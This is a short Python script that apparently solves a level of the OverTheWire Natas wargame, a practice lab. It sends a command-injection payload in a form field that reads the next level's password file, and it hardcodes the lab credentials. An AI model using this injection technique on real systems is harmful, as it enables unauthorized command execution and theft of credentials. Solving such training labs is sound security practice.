import requests


url = "http://natas16.natas.labs.overthewire.org/"
username = "natas16"
pw = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
session = requests.Session()
response = session.post(url, auth=(username, pw), data={"needle": "$(cat /etc/natas_webpass/natas17 > /proc/$$/fd/1)qqq"})
print(response.text)
